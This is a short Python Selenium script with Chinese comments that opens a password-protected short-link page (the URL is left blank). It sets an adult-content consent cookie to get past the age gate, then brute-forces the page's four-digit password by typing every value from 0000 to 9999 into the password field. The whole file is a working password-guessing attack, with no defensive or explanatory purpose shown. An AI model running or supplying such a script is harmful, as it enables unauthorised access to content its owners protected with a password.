from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

driver =  webdriver.Edge("msedgedriver") #edge kernal
url = "" #reurl網址
driver.get(url)


driver.add_cookie({"name": "AGREE_ADULT", "value": "true"}) #帶R18 cookie
time.sleep(3)
element = driver.find_element_by_xpath("//input[@name='password']")
for i in range(0000,10000):#暴力嘗試0000~9999
    s = '{0:04}'.format(i)
    element.send_keys(s)
    print(s)
    element.send_keys(Keys.RETURN)
    element.send_keys(Keys.CONTROL,'a')
    element.send_keys(Keys.BACK_SPACE)